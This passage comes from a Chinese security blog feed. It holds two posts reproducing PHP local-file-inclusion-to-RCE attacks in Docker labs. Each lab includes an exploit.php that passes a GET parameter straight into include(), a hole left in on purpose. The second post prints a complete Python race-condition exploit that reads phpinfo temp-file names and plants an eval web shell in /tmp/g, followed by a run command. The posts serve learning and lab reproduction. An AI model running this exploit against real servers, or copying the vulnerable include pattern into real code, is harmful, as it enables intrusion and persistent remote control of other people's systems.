locale</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get clean &amp;&amp; apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install locales</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Update locales</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> locale-gen en_US.UTF-8</span></span><br><span class="line"><span class="keyword">ENV</span> LANG en_US.UTF-<span class="number">8</span></span><br><span class="line"><span class="keyword">ENV</span> LANGUAGE en_US:en</span><br><span class="line"><span class="keyword">ENV</span> LC_ALL en_US.UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Install apache2 &amp; php7</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y software-properties-common &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-add-repository multiverse &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y apache2 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y \</span></span><br><span class="line"><span class="language-bash">      libapache2-mod-php7.0 \</span></span><br><span class="line"><span class="language-bash">      php7.0 \</span></span><br><span class="line"><span class="language-bash">      php7.0-curl \</span></span><br><span class="line"><span class="language-bash">      php7.0-cli \</span></span><br><span class="line"><span class="language-bash">      php7.0-common \</span></span><br><span class="line"><span class="language-bash">      php7.0-mbstring \</span></span><br><span class="line"><span class="language-bash">      php7.0-gd \</span></span><br><span class="line"><span class="language-bash">      php7.0-intl \</span></span><br><span class="line"><span class="language-bash">      php7.0-xml \</span></span><br><span class="line"><span class="language-bash">      php7.0-mysql \</span></span><br><span class="line"><span class="language-bash">      php7.0-mcrypt \</span></span><br><span class="line"><span class="language-bash">      php7.0-zip \</span></span><br><span class="line"><span class="language-bash">      php7.0-bz2 \</span></span><br><span class="line"><span class="language-bash">      php7.0-gmp  &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">      apt-get clean &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">      <span class="built_in">cd</span> /var/www/html &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;&lt;h3&gt; Could you hack me ?&#x27;</span> &gt; index.html</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copy files</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> exploit.php  /var/www/html/exploit.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Expose http port 80</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start apache services</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;apachectl&quot;</span>, <span class="string">&quot;-DFOREGROUND&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>exploit.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构建镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t php_include .</span><br></pre></td></tr></table></figure><p>创建并启动一个容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name php_include_rce -itd -p 8899:80  php_include</span><br></pre></td></tr></table></figure><p>读一下&#x2F;etc&#x2F;passwd 环境搭建成功</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220322175213283.png" alt="image-20220322175213283"></p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>Exp：<a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">wupco&#x2F;PHP_INCLUDE_TO_SHELL_CHAR_DICT (github.com)</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py <span class="comment">#生成payload</span></span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220322175445388.png" alt="image-20220322175445388"></p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220322175636664.png" alt="image-20220322175636664"></p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220322175733998.png" alt="image-20220322175733998"></p><p>利用 iconv filter 等编码组合构造出特定的PHP代码进而造成无需临时文件的RCE的姿势还是相当骚的，菜鸡只能默默感叹，当我还在执着于临时文件的时候，有的大师傅就已经fuzz完成了不需要临时文件的方法来file include rce，学习的道路还很长啊哎。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://tttang.com/archive/1395/">hxp CTF 2021 - The End Of LFI? - 跳跳糖 (tttang.com)</a></p><p><a href="https://mp.weixin.qq.com/s/ujxmyvRUaMN_rV7u5xZqtw">php:&#x2F;&#x2F;filter特性包含任意文件getshell (qq.com)</a></p><p><a href="https://github.com/loknop">loknop (github.com)</a></p><p><a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">Solving “includer’s revenge” from hxp ctf 2021 without controlling any files (github.com)</a></p><p><a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">wupco&#x2F;PHP_INCLUDE_TO_SHELL_CHAR_DICT (github.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP本地文件包含RCE之phpinfo利用</title>
      <link href="/posts/3974312057/"/>
      <url>/posts/3974312057/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>PHP文件包含漏洞中，如果找不到可以包含的文件，我们可以通过包含临时文件的方法来getshell。因为临时文件名是随机的，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>使用Dockerfile搭建复现环境</p><p>Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">16.04</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the locale</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get clean &amp;&amp; apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install locales</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Update locales</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> locale-gen en_US.UTF-8</span></span><br><span class="line"><span class="keyword">ENV</span> LANG en_US.UTF-<span class="number">8</span></span><br><span class="line"><span class="keyword">ENV</span> LANGUAGE en_US:en</span><br><span class="line"><span class="keyword">ENV</span> LC_ALL en_US.UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Install apache2 &amp; php7</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y software-properties-common &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-add-repository multiverse &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y apache2 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y \</span></span><br><span class="line"><span class="language-bash">      libapache2-mod-php7.0 \</span></span><br><span class="line"><span class="language-bash">      php7.0 \</span></span><br><span class="line"><span class="language-bash">      php7.0-curl \</span></span><br><span class="line"><span class="language-bash">      php7.0-cli \</span></span><br><span class="line"><span class="language-bash">      php7.0-common \</span></span><br><span class="line"><span class="language-bash">      php7.0-mbstring \</span></span><br><span class="line"><span class="language-bash">      php7.0-gd \</span></span><br><span class="line"><span class="language-bash">      php7.0-intl \</span></span><br><span class="line"><span class="language-bash">      php7.0-xml \</span></span><br><span class="line"><span class="language-bash">      php7.0-mysql \</span></span><br><span class="line"><span class="language-bash">      php7.0-mcrypt \</span></span><br><span class="line"><span class="language-bash">      php7.0-zip \</span></span><br><span class="line"><span class="language-bash">      php7.0-bz2 \</span></span><br><span class="line"><span class="language-bash">      php7.0-gmp  &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">      apt-get clean &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">      <span class="built_in">cd</span> /var/www/html &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;&lt;h3&gt; Could you hack me ?&#x27;</span> &gt; index.html</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copy files</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> exploit.php  /var/www/html/exploit.php</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> phpinfo.php  /var/www/html/phpinfo.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Expose http port 80</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start apache services</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;apachectl&quot;</span>, <span class="string">&quot;-DFOREGROUND&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>exploit.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>phpinfo.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><p>构建镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t phpinfo_include .</span><br></pre></td></tr></table></figure><p>创建并启动一个容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name phpinfo_include_rce -itd -p 8899:80  phpinfo_include</span><br></pre></td></tr></table></figure><p>读一下&#x2F;etc&#x2F;passwd 环境搭建成功</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220322175213283.png" alt="image-20220322175213283"></p><p>phpinfo</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220323114409709.png" alt="image-20220323114409709"></p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup</span>(<span class="params">host, port</span>):</span><br><span class="line">    TAG=<span class="string">&quot;Security Test&quot;</span></span><br><span class="line">    PAYLOAD=<span class="string">&quot;&quot;&quot;%s\r</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents(&#x27;/tmp/g&#x27;, &#x27;&lt;?=eval($_REQUEST[1])?&gt;&#x27;)?&gt;\r&quot;&quot;&quot;</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">&quot;&quot;&quot;-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r&quot;&quot;&quot;</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">&quot;A&quot;</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot; HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: &quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s&quot;&quot;&quot;</span> %(<span class="built_in">len</span>(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script   </span></span><br><span class="line">    LFIREQ=<span class="string">&quot;&quot;&quot;GET /exploit.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phpInfoLFI</span>(<span class="params">host, port, phpinforeq, offset, lfireq, tag</span>):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadWorker</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, e, l, m, *args</span>):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span>                </span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&quot;\nGot it! Shell created in /tmp/g&quot;</span></span><br><span class="line">                    self.event.<span class="built_in">set</span>()</span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getOffset</span>(<span class="params">host, port, phpinforeq</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    </span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i        </span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">&quot;0\r\n\r\n&quot;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> i == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;No php tmp_name in phpinfo output&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;found %s at %i&quot;</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;LFI With PHPInfo()&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;-=&quot;</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = <span class="built_in">int</span>(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error with poolsz %d: %s&quot;</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Getting initial offset...&quot;</span>,  </span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">&quot;\r% 4d / % 4d&quot;</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Woot!  \m/&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;:(&quot;</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\nTelling threads to shutdown...&quot;</span></span><br><span class="line">        e.<span class="built_in">set</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Shuttin&#x27; down...&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py xxx.xxx.xxx.xxx port <span class="number">100</span></span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220323115012454.png" 